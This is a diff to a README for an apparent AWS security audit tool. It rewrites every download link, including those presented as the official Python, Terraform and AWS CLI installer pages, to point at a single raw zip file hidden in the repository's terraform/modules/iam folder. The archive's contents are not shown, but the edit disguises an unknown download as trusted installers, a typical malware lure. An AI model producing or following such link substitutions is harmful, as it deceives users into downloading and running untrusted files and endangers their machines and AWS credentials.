@@ -1,12 +1,12 @@
 # 🛡️ aws-security-best-practices - Audit AWS with clear test steps
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Spacewalkisostasy809/aws-security-best-practices)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the files:
 
-https://github.com/Spacewalkisostasy809/aws-security-best-practices
+https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
 
 ## 🖥️ What this project does
 
@@ -51,7 +51,7 @@ Follow these steps in order.
 
 Open this link in your browser:
 
-https://github.com/Spacewalkisostasy809/aws-security-best-practices
+https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
 
 ### 2. Download the project
 
@@ -84,7 +84,7 @@ After extraction:
 
 If Python is not on your PC:
 
-- Go to https://www.python.org/downloads/windows/
+- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
 - Download the latest Python 3 installer
 - Run the installer
 - Make sure you check Add Python to PATH
@@ -102,7 +102,7 @@ If you see a version number, Python is ready
 
 If you want to use the sample environments:
 
-- Go to https://developer.hashicorp.com/terraform/downloads
+- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
 - Download the Windows version
 - Unzip it
 - Move terraform.exe into a folder like C:\Terraform
@@ -118,7 +118,7 @@ To check it:
 
 If you want to connect to AWS:
 
-- Go to https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html
+- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
 - Install AWS CLI for Windows
 - Open Command Prompt
 - Type: aws --version
